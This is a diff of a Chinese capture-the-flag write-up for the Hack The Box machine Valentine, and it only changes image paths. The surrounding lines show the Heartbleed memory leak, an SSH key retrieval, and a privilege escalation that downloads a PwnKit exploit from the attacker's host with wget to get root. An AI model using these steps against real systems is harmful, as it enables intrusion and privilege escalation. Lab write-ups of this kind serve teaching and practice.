@@ -5,7 +5,7 @@
 
 # 012-Valentine
 
-![image-20230429004811139](resource/012-Valentine.assets/image-20230429004811139.png)
+![image-20230429004811139](/resource/012-Valentine.assets/image-20230429004811139.png)
 
 靶机IP：10.10.10.79
 
@@ -36,7 +36,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds
 
 访问80、443端口都是如下一张图片：
 
-![image-20230429004953743](resource/012-Valentine.assets/image-20230429004953743.png)
+![image-20230429004953743](/resource/012-Valentine.assets/image-20230429004953743.png)
 
 
 
@@ -157,11 +157,11 @@ msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
 
 ```
 
-![image-20230429155205097](resource/012-Valentine.assets/image-20230429155205097.png)
+![image-20230429155205097](/resource/012-Valentine.assets/image-20230429155205097.png)
 
-![image-20230429155239318](resource/012-Valentine.assets/image-20230429155239318.png)
+![image-20230429155239318](/resource/012-Valentine.assets/image-20230429155239318.png)
 
-![image-20230429155329208](resource/012-Valentine.assets/image-20230429155329208.png)
+![image-20230429155329208](/resource/012-Valentine.assets/image-20230429155329208.png)
 
 心脏滴血是一个信息泄露漏洞，每次泄露的信息并不一样，所以需要多执行几次。
 
@@ -233,7 +233,7 @@ Received heartbeat response:
 
 同样，因为信息泄露的不确定性，我们需要多执行几次，以发现所期望的敏感信息。
 
-![image-20230429160817669](resource/012-Valentine.assets/image-20230429160817669.png)
+![image-20230429160817669](/resource/012-Valentine.assets/image-20230429160817669.png)
 
 执行了多次后，发现泄露了如下信息：
 
@@ -268,7 +268,7 @@ Target: https://10.10.10.79/
 
 访问dev目录如下：
 
-![image-20230429161913176](resource/012-Valentine.assets/image-20230429161913176.png)
+![image-20230429161913176](/resource/012-Valentine.assets/image-20230429161913176.png)
 
 查看notes.txt
 
@@ -285,7 +285,7 @@ To do:
 
 查看hype_key：
 
-![image-20230429163925200](resource/012-Valentine.assets/image-20230429163925200.png)
+![image-20230429163925200](/resource/012-Valentine.assets/image-20230429163925200.png)
 
 下载hype_key
 
@@ -385,7 +385,7 @@ Host *
     HostKeyAlgorithms=+ssh-rsa
 ```
 
-![image-20230429170722849](resource/012-Valentine.assets/image-20230429170722849.png)
+![image-20230429170722849](/resource/012-Valentine.assets/image-20230429170722849.png)
 
 
 
@@ -412,7 +412,7 @@ hype@Valentine:/tmp$ ./linpeas.sh > result.txt
 
 查看result.txt，发现系统存在sudo CVE-2021-4034漏洞，可利用该漏洞提权。
 
-![image-20230429172250485](resource/012-Valentine.assets/image-20230429172250485.png)
+![image-20230429172250485](/resource/012-Valentine.assets/image-20230429172250485.png)
 
 ```shell
 hype@Valentine:/tmp$ wget http://10.10.14.22/PwnKit
@@ -423,7 +423,7 @@ uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambash
 root@Valentine:/tmp# 
 ```
 
-![image-20230429172533596](resource/012-Valentine.assets/image-20230429172533596.png)
+![image-20230429172533596](/resource/012-Valentine.assets/image-20230429172533596.png)
 
 ```shell
 root@Valentine:/tmp# cat /root/root.txt 
@@ -436,7 +436,7 @@ root@Valentine:/tmp# cat /home/hype/user.txt
 
 查看result.txt，发现tmux session
 
-![image-20230429174112440](resource/012-Valentine.assets/image-20230429174112440.png)
+![image-20230429174112440](/resource/012-Valentine.assets/image-20230429174112440.png)
 
 通过tmux进行提权，成功获取root权限：
 
@@ -448,7 +448,7 @@ uid=0(root) gid=0(root) groups=0(root)
 root@Valentine:/tmp# 
 ```
 
-![image-20230429174244442](resource/012-Valentine.assets/image-20230429174244442.png)
+![image-20230429174244442](/resource/012-Valentine.assets/image-20230429174244442.png)
 
 
 
